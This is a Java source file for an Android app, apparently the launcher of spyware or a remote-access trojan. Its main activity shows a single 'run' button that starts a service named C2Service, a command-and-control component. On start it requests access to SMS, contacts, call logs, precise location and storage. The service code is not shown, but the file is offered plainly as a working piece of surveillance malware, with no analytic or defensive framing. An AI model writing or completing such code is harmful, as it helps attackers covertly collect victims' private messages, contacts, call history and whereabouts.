package com.vanta.core;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setPadding(60, 150, 60, 0);
        Button btn = new Button(this);
        btn.setText("تشغيل");
        btn.setOnClickListener(v -> {
            Intent i = new Intent(this, C2Service.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
        });
        l.addView(btn);
        setContentView(l);
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_EXTERNAL_STORAGE
            }, 1);
        }
    }
}